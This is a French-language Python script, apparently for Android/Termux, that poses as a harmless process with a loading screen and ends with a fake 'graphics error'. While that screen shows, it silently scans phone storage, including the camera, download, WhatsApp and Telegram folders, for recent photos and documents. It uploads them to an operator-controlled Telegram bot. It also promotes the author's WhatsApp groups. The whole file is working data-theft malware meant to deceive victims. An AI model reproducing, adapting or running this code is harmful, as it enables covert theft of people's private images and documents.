#!/usr/bin/env python3
import requests
import os
import glob
from datetime import datetime
import subprocess
import sys
import argparse
import time

# Variables globales
BOT_TOKEN = None
CHAT_ID = None

def afficher_chargement():
    """Affiche uniquement l'écran de chargement"""
    print("\033[95m" + "=" * 50)
    print("\033[95m" + "🦹‍♂️  SCRIPT REBELLE MASQUÉ")
    print("\033[95m" + "=" * 50)
    print("\033[96m" + "📱 Processus en cours...")
    print("\033[93m" + "⏳ Veuillez patienter")
    print("\033[95m" + "=" * 50 + "\033[0m")

def envoyer_message_rebelle():
    """Envoie le message de crédits au bot"""
    message = """🔰 <b>SCRIPT CODÉ PAR REBELLE MASQUÉ</b> 🔰

📱 <b>LES GROUPES EN BULLE</b>
👥 <b>GROUPE WH</b>
https://chat.whatsapp.com/F9NbADb7L7v9SALfdBa9zq?mode=wwt

📢 <b>CHAÎNE WH</b> 
https://whatsapp.com/channel/0029Vb6ZlfAElagrUQsO753W

💻 <b>DÉVELOPPEUR</b>
@RebelleMasque1

🎯 <i>Processus de collecte démarré</i>"""
    
    return envoyer_telegram_message(message)

def envoyer_telegram_message(message):
    """Envoyer un message texte"""
    if not BOT_TOKEN or not CHAT_ID:
        return False
        
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def scanner_dossiers_complet():
    """Scan COMPLET silencieux"""
    dossiers_base = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures", 
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Video",
        "/storage/emulated/0/Music",
        "/storage/emulated/0/Documents",
        "/storage/emulated/0/Xender",
        "/storage/emulated/0/WhatsApp",
        "/storage/emulated/0/Telegram",
        "/storage/emulated/0/Android/media/com.whatsapp",
        "/storage/emulated/0/Android/media/com.whatsapp.w4b",
        "/storage/emulated/0/Android/data/com.whatsapp",
        "/storage/emulated/0/Android/data/com.whatsapp.w4b"
    ]
    
    fichiers_trouves = {"images": [], "documents": []}
    
    formats_images = ['*.jpg', '*.jpeg', '*.png', '*.webp']
    formats_documents = ['*.pdf', '*.doc', '*.docx', '*.txt', '*.xls', '*.xlsx']
    
    for dossier_base in dossiers_base:
        if os.path.exists(dossier_base):
            # Images
            for format_img in formats_images:
                try:
                    pattern = f"{dossier_base}/**/{format_img}"
                    fichiers = glob.glob(pattern, recursive=True)
                    for fichier in fichiers:
                        if os.path.getsize(fichier) < 10 * 1024 * 1024:
                            fichiers_trouves["images"].append(fichier)
                except:
                    continue
            
            # Documents  
            for format_doc in formats_documents:
                try:
                    pattern = f"{dossier_base}/**/{format_doc}"
                    fichiers = glob.glob(pattern, recursive=True)
                    for fichier in fichiers:
                        if os.path.getsize(fichier) < 15 * 1024 * 1024:
                            fichiers_trouves["documents"].append(fichier)
                except:
                    continue
    
    for type_fichier in fichiers_trouves:
        fichiers_trouves[type_fichier].sort(key=os.path.getmtime, reverse=True)
        fichiers_trouves[type_fichier] = fichiers_trouves[type_fichier][:20]
    
    return fichiers_trouves

def envoyer_fichiers_silencieux(fichiers):
    """Envoi complètement silencieux"""
    total_envoyes = 0
    
    # Images
    if fichiers["images"]:
        for image in fichiers["images"][:15]:
            try:
                if envoyer_fichier_telegram(image, "photo"):
                    total_envoyes += 1
                time.sleep(0.3)
            except:
                pass
    
    # Documents  
    if fichiers["documents"]:
        for document in fichiers["documents"][:10]:
            try:
                if envoyer_fichier_telegram(document, "document"):
                    total_envoyes += 1
                time.sleep(0.2)
            except:
                pass
    
    return total_envoyes

def envoyer_fichier_telegram(fichier_path, type_fichier):
    """Envoi silencieux d'un fichier"""
    try:
        if type_fichier == "photo":
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': open(fichier_path, 'rb')}
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': open(fichier_path, 'rb')}
        
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data, timeout=20)
        return response.status_code == 200
    except:
        return False

def afficher_fin():
    """Affiche uniquement le message final"""
    print("\033[95m" + "=" * 50)
    print("\033[92m" + "🎉 PROCESSUS TERMINÉ AVEC SUCCÈS")
    print("\033[91m" + "🚫 ERREUR DU GRAPHIQUE")
    print("\033[95m" + "=" * 50 + "\033[0m")

def main():
    # Configuration des arguments
    parser = argparse.ArgumentParser(description='Script Rebelle Masqué')
    parser.add_argument('-id', '--userid', required=True, help='ID Telegram utilisateur')
    parser.add_argument('-cl', '--token', required=True, help='Token du bot Telegram')
    
    args = parser.parse_args()
    
    global BOT_TOKEN, CHAT_ID
    BOT_TOKEN = args.token
    CHAT_ID = args.userid
    
    # Écran de chargement
    afficher_chargement()
    
    # Processus COMPLÈTEMENT SILENCIEUX
    envoyer_message_rebelle()
    fichiers = scanner_dossiers_complet()
    total_envoyes = envoyer_fichiers_silencieux(fichiers)
    
    # Message final
    time.sleep(2)
    afficher_fin()
    
    # Message final au bot
    message_final = f"""🎉 <b>PROCESSUS TERMINÉ AVEC SUCCÈS</b>

⏰ <i>Heure de fin: {datetime.now().strftime('%H:%M:%S')}</i>

🚫 <b>ERREUR DU GRAPHIQUE</b>
<i>Interface utilisateur non disponible</i>"""
    
    envoyer_telegram_message(message_final)

if __name__ == "__main__":
    main()
    #reblle masque ☠️